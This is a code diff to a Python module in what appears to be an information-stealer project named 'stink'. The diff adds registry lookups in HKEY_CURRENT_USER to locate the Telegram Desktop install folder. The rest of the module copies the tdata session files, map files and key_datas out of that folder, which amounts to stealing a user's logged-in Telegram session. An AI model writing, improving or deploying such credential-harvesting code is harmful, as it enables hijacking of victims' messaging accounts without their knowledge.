@@ -1,6 +1,7 @@
 from re import findall
 from shutil import copyfile
 from os import listdir, path, makedirs
+from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER
 
 from stink.helpers.config import TelegramConfig
 
@@ -24,15 +25,47 @@ class Telegram:
         if not path.exists(folder):
             makedirs(folder)
 
+    @staticmethod
+    def __get_telegram_path():
+        """
+        Gets the Telegram installation path from the registry.
+        :return: str
+        """
+        try:
+            key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
+
+            for i in range(QueryInfoKey(key)[0]):
+
+                subkey_name = EnumKey(key, i)
+                subkey = OpenKey(key, subkey_name)
+
+                try:
+                    display_name = QueryValueEx(subkey, "DisplayName")[0]
+
+                    if "Telegram" not in display_name:
+                        continue
+
+                    return QueryValueEx(subkey, "InstallLocation")[0]
+                except FileNotFoundError:
+                    pass
+        except Exception as e:
+            print(f"An error occurred: {e}")
+
+        return None
+
     def __get_sessions(self) -> None:
         """
         Collects sessions from the Telegram.
         :return: None
         """
-        if not path.exists(self.__config.SessionsPath):
+        telegram_path = self.__get_telegram_path()
+
+        if not telegram_path or not path.exists(telegram_path):
+            print(f"[Telegram]: No telegram found")
             return
 
-        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.__config.SessionsPath)], [])
+        telegram_data = path.join(telegram_path, "tdata")
+        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(telegram_data)], [])
 
         if not sessions:
             return
@@ -42,17 +75,17 @@ class Telegram:
         sessions.remove("D877F783D5D3EF8C")
 
         for session in sessions:
-            copyfile(path.join(self.__config.SessionsPath, session), path.join(self.__full_path, session))
+            copyfile(path.join(telegram_data, session), path.join(self.__full_path, session))
 
-        maps = sum([findall(r"map.*", file) for file in listdir(path.join(self.__config.SessionsPath, "D877F783D5D3EF8C"))], [])
+        maps = sum([findall(r"map.*", file) for file in listdir(path.join(telegram_data, "D877F783D5D3EF8C"))], [])
 
         for map in maps:
             copyfile(
-                path.join(self.__config.SessionsPath, "D877F783D5D3EF8C", map),
+                path.join(telegram_data, "D877F783D5D3EF8C", map),
                 path.join(self.__full_path, "D877F783D5D3EF8C", map)
             )
 
-        copyfile(path.join(self.__config.SessionsPath, "key_datas"), path.join(self.__full_path, "key_datas"))
+        copyfile(path.join(telegram_data, "key_datas"), path.join(self.__full_path, "key_datas"))
 
     def run(self) -> None:
         """
